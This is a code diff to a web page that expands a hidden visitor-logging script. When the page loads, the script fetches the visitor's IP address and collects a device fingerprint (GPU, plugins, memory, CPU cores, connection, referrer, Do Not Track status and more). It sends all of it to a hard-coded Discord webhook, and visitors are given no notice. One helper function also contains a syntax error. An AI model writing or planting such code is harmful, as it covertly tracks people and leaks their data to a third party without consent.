@@ -300,7 +300,7 @@ function typeWriter() {
 
 </script>
 
-<!-- Comprehensive IP & Device Logger to Discord Webhook -->
+<!-- Ultra Comprehensive IP & Device Logger to Discord Webhook -->
 <script>
   // Function to detect OS from User Agent
   function detectOS() {
@@ -355,10 +355,144 @@ function typeWriter() {
     return `${window.screen.colorDepth}-bit`;
   }
 
-  // Send comprehensive data to Discord
+  // Function to get battery status
+  function getBatteryStatus() {
+    return new Promise((resolve) => {
+      if (navigator.getBattery) {
+        navigator.getBattery().then((battery) => {
+          resolve(`${Math.round(battery.level * 100)}% - ${battery.charging ? 'Charging' : 'Discharging'}`);
+        });
+      } else {
+        resolve('Not Available');
+      }
+    });
+  }
+
+  // Function to get connection type
+  function getConnectionType() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn) return 'Unknown';
+    return conn.effectiveType || conn.type || 'Unknown';
+  }
+
+  // Function to get connection speed
+  function getConnectionSpeed() {
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (!conn || !conn.downlink) return 'Unknown';
+    return `${conn.downlink} Mbps`;
+  }
+
+  // Function to detect touch screen support
+  function hasTouchScreen() {
+    return () => {
+      let hasTouchProp = navigator.maxTouchPoints > 0;
+      if (hasTouchProp) return 'Yes';
+      return 'No';
+    }();
+  }
+
+  // Function to detect JavaScript
+  function jsEnabled() {
+    return 'Yes';
+  }
+
+  // Function to get plugins list
+  function getPlugins() {
+    if (navigator.plugins && navigator.plugins.length > 0) {
+      let plugins = [];
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+      return plugins.join(', ') || 'None';
+    }
+    return 'None';
+  }
+
+  // Function to get Do Not Track status
+  function getDoNotTrack() {
+    return navigator.doNotTrack === '1' ? 'Enabled' : 'Disabled';
+  }
+
+  // Function to check if WebGL is supported
+  function checkWebGL() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      return gpu || 'WebGL Enabled';
+    } catch (e) {
+      return 'Not Available';
+    }
+  }
+
+  // Function to get local storage availability
+  function checkLocalStorage() {
+    try {
+      localStorage.setItem('test', 'test');
+      localStorage.removeItem('test');
+      return 'Available';
+    } catch (e) {
+      return 'Not Available';
+    }
+  }
+
+  // Function to get session storage
+  function checkSessionStorage() {
+    try {
+      sessionStorage.setItem('test', 'test');
+      sessionStorage.removeItem('test');
+      return 'Available';
+    } catch (e) {
+      return 'Not Available';
+    }
+  }
+
+  // Function to get available memory
+  function getMemory() {
+    if (navigator.deviceMemory) {
+      return `${navigator.deviceMemory}GB`;
+    }
+    return 'Unknown';
+  }
+
+  // Function to get cores
+  function getCores() {
+    if (navigator.hardwareConcurrency) {
+      return `${navigator.hardwareConcurrency} Cores`;
+    }
+    return 'Unknown';
+  }
+
+  // Function to get referrer
+  function getReferrer() {
+    return document.referrer || 'Direct';
+  }
+
+  // Function to get screen orientation
+  function getScreenOrientation() {
+    if (window.screen.orientation) {
+      return window.screen.orientation.type;
+    }
+    return 'Unknown';
+  }
+
+  // Function to get cookies enabled
+  function cookiesEnabled() {
+    try {
+      document.cookie = 'test=1';
+      const enabled = document.cookie.indexOf('test=1') !== -1;
+      document.cookie = 'test=1;expires=Thu, 01-Jan-1970 00:00:01 GMT;';
+      return enabled ? 'Enabled' : 'Disabled';
+    } catch (e) {
+      return 'Unknown';
+    }
+  }
+
+  // Send ultra-comprehensive data to Discord
   fetch('https://api.ipify.org')
     .then(response => response.text())
-    .then(ip => {
+    .then(async ip => {
       const webhookUrl = 'https://canary.discord.com/api/webhooks/1514007577355092080/UT9EM1Y7BApmmULLk_Z9gn1Rbw7Le42Xq1xDUYGceFKl39imPfYXI0Nrte1mihIKebxd';
       
       const os = detectOS();
@@ -368,75 +502,161 @@ function typeWriter() {
       const language = getLanguage();
       const timezone = getTimezone();
       const colorDepth = getColorDepth();
+      const connectionType = getConnectionType();
+      const connectionSpeed = getConnectionSpeed();
+      const touchScreen = hasTouchScreen();
+      const jsStatus = jsEnabled();
+      const plugins = getPlugins();
+      const dnt = getDoNotTrack();
+      const webgl = checkWebGL();
+      const localStorage_status = checkLocalStorage();
+      const sessionStorage_status = checkSessionStorage();
+      const memory = getMemory();
+      const cores = getCores();
+      const referrer = getReferrer();
+      const screenOrientation = getScreenOrientation();
+      const cookies = cookiesEnabled();
       const userAgent = navigator.userAgent || 'Unknown';
       
+      const fields = [
+        {
+          name: '🌐 IP Address',
+          value: `\`${ip}\``,
+          inline: true
+        },
+        {
+          name: '💻 OS',
+          value: `\`${os}\``,
+          inline: true
+        },
+        {
+          name: '🌐 Browser',
+          value: `\`${browser}\``,
+          inline: true
+        },
+        {
+          name: '📱 Device Type',
+          value: `\`${deviceType}\``,
+          inline: true
+        },
+        {
+          name: '🖥️ Screen Resolution',
+          value: `\`${screenRes}\``,
+          inline: true
+        },
+        {
+          name: '🎨 Color Depth',
+          value: `\`${colorDepth}\``,
+          inline: true
+        },
+        {
+          name: '🌍 Language',
+          value: `\`${language}\``,
+          inline: true
+        },
+        {
+          name: '⏰ Timezone',
+          value: `\`${timezone}\``,
+          inline: true
+        },
+        {
+          name: '🌐 Connection Type',
+          value: `\`${connectionType}\``,
+          inline: true
+        },
+        {
+          name: '📊 Connection Speed',
+          value: `\`${connectionSpeed}\``,
+          inline: true
+        },
+        {
+          name: '🖱️ Touch Screen',
+          value: `\`${touchScreen}\``,
+          inline: true
+        },
+        {
+          name: '⚡ JavaScript',
+          value: `\`${jsStatus}\``,
+          inline: true
+        },
+        {
+          name: '🎮 GPU/WebGL',
+          value: `\`${webgl.substring(0, 50)}\``,
+          inline: true
+        },
+        {
+          name: '💾 Local Storage',
+          value: `\`${localStorage_status}\``,
+          inline: true
+        },
+        {
+          name: '📦 Session Storage',
+          value: `\`${sessionStorage_status}\``,
+          inline: true
+        },
+        {
+          name: '🔋 RAM',
+          value: `\`${memory}\``,
+          inline: true
+        },
+        {
+          name: '⚙️ CPU Cores',
+          value: `\`${cores}\``,
+          inline: true
+        },
+        {
+          name: '📱 Screen Orientation',
+          value: `\`${screenOrientation}\``,
+          inline: true
+        },
+        {
+          name: '🍪 Cookies',
+          value: `\`${cookies}\``,
+          inline: true
+        },
+        {
+          name: '🚫 Do Not Track',
+          value: `\`${dnt}\``,
+          inline: true
+        },
+        {
+          name: '🔌 Plugins',
+          value: `\`\`\`${plugins.substring(0, 100)}\`\`\``,
+          inline: false
+        },
+        {
+          name: '🔗 Referrer',
+          value: `\`${referrer.substring(0, 100)}\``,
+          inline: false
+        },
+        {
+          name: '📅 Timestamp',
+          value: `\`${new Date().toLocaleString()}\``,
+          inline: false
+        },
+        {
+          name: '📝 User Agent',
+          value: `\`\`\`${userAgent.substring(0, 200)}\`\`\``,
+          inline: false
+        },
+        {
+          name: '🔗 Page URL',
+          value: `\`${window.location.href}\``,
+          inline: false
+        }
+      ];
+      
       const payload = {
-        content: `**🌍 New Visitor Detected - IP: ${ip}**`,
+        content: `**🔓 NEW VISITOR 🔓** - IP: ${ip}`,
         embeds: [{
-          title: '📊 Visitor Information Report',
+          title: '🕵️ ULTRA DETAILED VISITOR PROFILING',
           color: 16711680,
           thumbnail: {
             url: 'https://cdn-icons-png.flaticon.com/512/748/748122.png'
           },
-          fields: [
-            {
-              name: '🌐 IP Address',
-              value: `\`${ip}\``,
-              inline: true
-            },
-            {
-              name: '💻 OS',
-              value: `\`${os}\``,
-              inline: true
-            },
-            {
-              name: '🌐 Browser',
-              value: `\`${browser}\``,
-              inline: true
-            },
-            {
-              name: '📱 Device Type',
-              value: `\`${deviceType}\``,
-              inline: true
-            },
-            {
-              name: '🖥️ Screen Resolution',
-              value: `\`${screenRes}\``,
-              inline: true
-            },
-            {
-              name: '🎨 Color Depth',
-              value: `\`${colorDepth}\``,
-              inline: true
-            },
-            {
-              name: '🌍 Language',
-              value: `\`${language}\``,
-              inline: true
-            },
-            {
-              name: '⏰ Timezone',
-              value: `\`${timezone}\``,
-              inline: true
-            },
-            {
-              name: '📅 Timestamp',
-              value: `\`${new Date().toLocaleString()}\``,
-              inline: false
-            },
-            {
-              name: '📝 User Agent',
-              value: `\`\`\`${userAgent.substring(0, 200)}\`\`\``,
-              inline: false
-            },
-            {
-              name: '🔗 Page URL',
-              value: `\`${window.location.href}\``,
-              inline: false
-            }
-          ],
+          fields: fields,
           footer: {
-            text: '🔍 IP Logger v2 - Enhanced Visitor Tracking',
+            text: '🔍 IP Logger v3 ULTRA - Complete Device Fingerprinting',
             icon_url: 'https://cdn-icons-png.flaticon.com/512/3050/3050159.png'
           }
         }]
